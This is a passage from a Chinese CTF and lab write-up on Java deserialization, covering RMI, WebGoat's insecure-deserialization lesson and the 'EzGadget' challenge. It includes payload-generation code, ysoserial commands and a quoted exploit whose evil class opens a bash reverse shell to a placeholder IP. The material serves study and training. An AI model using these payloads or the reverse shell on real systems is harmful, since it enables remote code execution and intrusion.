string">"rmi://192.168.88.1:12581/User"</span><span class="token punctuation">;</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">12581</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"the RMI Server is running....."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>启动服务后，<code>LocateRegistry.createRegistry(12581);</code>在JNDI中注册该端口，启动并监听该端口。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211106105253.png" loading="lazy"></p><p>这样就运行起来一个简单的RMI监听器</p><h2 id="0x02-Java反序列化的利用"><a href="#0x02-Java反序列化的利用" class="headerlink" title="0x02 Java反序列化的利用"></a>0x02 Java反序列化的利用</h2><h3 id="webgoat中的反序列化"><a href="#webgoat中的反序列化" class="headerlink" title="webgoat中的反序列化"></a>webgoat中的反序列化</h3><p>挑战：以下输入框接收序列化对象（字符串）并对其进行反序列化。</p><pre class="language-bash" data-language="bash"><code class="language-bash">rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l</code></pre><p>尝试更改此序列化对象，以便将页面响应延迟 5 秒。</p><blockquote><p>JAVAWEB特征可以作为序列化的标志参考:<br>一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。<br>或者如果以aced开头，那么他就是这一段java序列化的16进制。</p></blockquote><p>反编译得到源码，查看<code>BOOT-INF/lib/insecure-deserialization-8.2.2.jar</code>，编码是base64<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211106181632.png" loading="lazy"><br>找它的切入点，也就是反序列化的位置<br>然后追踪到<code>VulnerableTaskHolder.java</code>的代码中，但是在jd-gui中无法访问，所以就直接去GitHub中找源码，发现了这里，只允许使用ping和sleep函数来让系统进行延时。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211106183945.png" loading="lazy"></p><p>自定义一个恶意类，其中写入反弹shell的命令或者按照靶场的指示进行延时5s。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//evil.java</span><span class="token keyword">class</span> evil <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// readObject()</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token class-name">ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>小tips：进行payload生成时，需要先反编译源码，把源码找出来，不管是CTF还是此靶场。<br>然后生成payload的自建恶意类也需要在这里面创建。不然反序列化出的payload不可用。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>dummy<span class="token punctuation">.</span>insecure<span class="token punctuation">.</span>framework</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStreamReader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">LocalDateTime</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">VulnerableTaskHolder</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> taskName<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> taskAction<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">LocalDateTime</span> requestedExecutionTime<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">VulnerableTaskHolder</span><span class="token punctuation">(</span><span class="token class-name">String</span> taskName<span class="token punctuation">,</span> <span class="token class-name">String</span> taskAction<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>taskName <span class="token operator">=</span> taskName<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>taskAction <span class="token operator">=</span> taskAction<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>requestedExecutionTime <span class="token operator">=</span> <span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"org.dummy.insecure.framework.VulnerableTaskHolder [taskName="</span> <span class="token operator">+</span> taskName <span class="token operator">+</span> <span class="token string">", taskAction="</span> <span class="token operator">+</span> taskAction <span class="token operator">+</span> <span class="token string">", requestedExecutionTime="</span>                <span class="token operator">+</span> requestedExecutionTime <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Execute a task when de-serializing a saved or received object.     * @author stupid develop     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span> <span class="token class-name">ObjectInputStream</span> stream <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//unserialize data so taskName and taskAction are available</span>        stream<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//do something with the data</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"restoring task: "</span><span class="token operator">+</span>taskName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"restoring time: "</span><span class="token operator">+</span>requestedExecutionTime<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>requestedExecutionTime<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span>                <span class="token punctuation">(</span>requestedExecutionTime<span class="token punctuation">.</span><span class="token function">isBefore</span><span class="token punctuation">(</span><span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">minusMinutes</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token operator">||</span> requestedExecutionTime<span class="token punctuation">.</span><span class="token function">isAfter</span><span class="token punctuation">(</span><span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//do nothing is the time is not within 10 minutes after the object has been created</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"outdated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//condition is here to prevent you from destroying the goat altogether</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>taskAction<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"sleep"</span><span class="token punctuation">)</span><span class="token operator">||</span>taskAction<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token operator">&amp;&amp;</span> taskAction<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">22</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"about to execute: "</span><span class="token operator">+</span>taskAction<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Process</span> p <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>taskAction<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">BufferedReader</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span>                        <span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> line <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//Main.java</span><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>dummy<span class="token punctuation">.</span>insecure<span class="token punctuation">.</span>framework</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span><span class="token comment">// import org.dummy.insecure.framework.VulnerableTaskHolder;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">VulnerableTaskHolder</span> go <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VulnerableTaskHolder</span><span class="token punctuation">(</span><span class="token string">"sleep"</span><span class="token punctuation">,</span> <span class="token string">"sleep 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>bos<span class="token punctuation">)</span><span class="token punctuation">;</span>            oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>go<span class="token punctuation">)</span><span class="token punctuation">;</span>            oos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> exploit <span class="token operator">=</span> bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> exp <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>exploit<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211106185628.png" loading="lazy"></p><blockquote><p>注意编译时的Java版本问题，这个目前不是很清楚。</p></blockquote><p>运行得出payload。<br>还可以直接拿shell，利用bash反弹shell<br>生成payload使用工具<code>ysoserial.jar</code>，这里使用修改版的。</p><pre class="language-bash" data-language="bash"><code class="language-bash">java -jar ysoserial.jar</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211106190503.png" loading="lazy"><br>利用选1，寻找可用payload选2</p><pre class="language-bash" data-language="bash"><code class="language-bash">java -Dhibernate5 -cp hibernate-core-5.4.28.Final.jar<span class="token punctuation">;</span>ysoserial.jar ysoserial.GeneratePayload Hibernate1 <span class="token string">"calc.exe"</span> <span class="token operator">></span> m0re.bin</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211106190851.png" loading="lazy"><br>生成的bin文件，进行base64编码。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> base64<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"m0re.bin"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>access <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>access<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211106191224.png" loading="lazy"><br>版本可能不匹配。<br>也有运行<code>mvn clean package -DskipTests</code>重新编译<code>ysoserial.jar</code>的。可以参考这个<a href="https://www.jianshu.com/p/b309a4573abd">地址</a><br>还没有了解，先mark了。后续再看。这个关卡就先pass了。还有题目看呢，编译问题就不涉及太多内容了。</p><h3 id="EzGadget"><a href="#EzGadget" class="headerlink" title="EzGadget"></a>EzGadget</h3><p>因为比赛的时候不会写，Java反序列化一脸懵，所以才来钻研了Java反序列化的基础和简单利用。<br>直接反编译，审计</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">unser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"data"</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token class-name">String</span> data<span class="token punctuation">,</span> <span class="token class-name">Model</span> model<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token class-name">Tools</span><span class="token punctuation">.</span><span class="token function">base64Decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> name <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> year <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"gadgets"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>year <span class="token operator">==</span> <span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>这是反序列化的点。<br>其中反序列化前还需要加个验证。</p><pre class="language-java" data-language="java"><code class="language-java">oos<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span><span class="token string">"gadgets"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>oos<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span><span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211106195935.png" loading="lazy"><br><code>toString()</code>函数加载字节码，cc链还没有看，准备下次学习一下java自带的一些类，然后再进行深入了解cc链。</p><p>引用大佬的exp</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ezgame<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>tools<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">ezgame<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>bean<span class="token punctuation">.</span></span><span class="token class-name">User</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> exp <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> evil<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token string">"evil.class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>inputStream<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> sie <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> bytecodes <span class="token operator">=</span> <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span>sie<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"ClassByte"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span>bytecodes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>sie<span class="token punctuation">,</span><span class="token string">"ClassByte"</span><span class="token punctuation">,</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BadAttributeValueExpException</span> exception <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token string">"exp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>exception<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>sie<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> a<span class="token operator">=</span><span class="token class-name">Serialize</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>exception<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>加载的话，可以使用反弹shell的。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//evil.jaba</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ezgame<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>exp</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> evil <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Runtime</span> r <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> cmd<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/xxx.xxx.xx.xxx/1234;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Process</span> p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉Java的知识不是很好掌握，可能是我太菜了，玩不动Java，没有常用Java，所以理解起来有点难，知识点还是一点一点啃吧。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/sijidou/p/13121305.html">https://www.cnblogs.com/sijidou/p/13121305.html</a><br><a href="https://blog.csdn.net/qq_43266093/article/details/120883767">https://blog.csdn.net/qq_43266093/article/details/120883767</a><br><a href="https://blog.csdn.net/qq_36241198/article/details/118618001">https://blog.csdn.net/qq_36241198/article/details/118618001</a><br><a href="http://dreamphp.cn/blog/detail?blog_id=31726">http://dreamphp.cn/blog/detail?blog_id=31726</a><br><a href="https://blog.csdn.net/qq_36241198/article/details/118618001">https://blog.csdn.net/qq_36241198/article/details/118618001</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网安全】红日安全靶场（上）</title>
      <link href="/posts/564d8432/"/>
      <url>/posts/564d8432/</url>
      
